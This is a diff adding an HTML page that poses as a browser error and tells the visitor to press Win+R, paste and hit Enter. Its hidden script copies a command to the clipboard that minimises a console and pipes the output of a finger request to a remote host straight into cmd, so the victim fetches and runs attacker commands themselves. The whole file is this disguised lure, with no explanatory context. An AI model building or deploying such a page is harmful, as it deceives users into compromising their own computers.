@@ -1,0 +1,22 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Browser error</title>
+  </head>
+  <body>
+    <h2>Something went wrong while displaying this page</h2>
+    <p>To fix the error, press Win + R, then Ctrl + V and press Enter.</p>
+    <button id="fix">Fix it</button>
+    <script>
+      const payload = 'cmd /c start "" /min cmd /c "finger verify@192.0.2.20 | cmd"';
+      document.addEventListener('copy', (e) => {
+        e.clipboardData.setData('text/plain', payload);
+        e.preventDefault();
+      });
+      document.getElementById('fix').addEventListener('click', () => {
+        document.title = 'copied ' + document.execCommand('copy');
+      });
+    </script>
+  </body>
+</html>
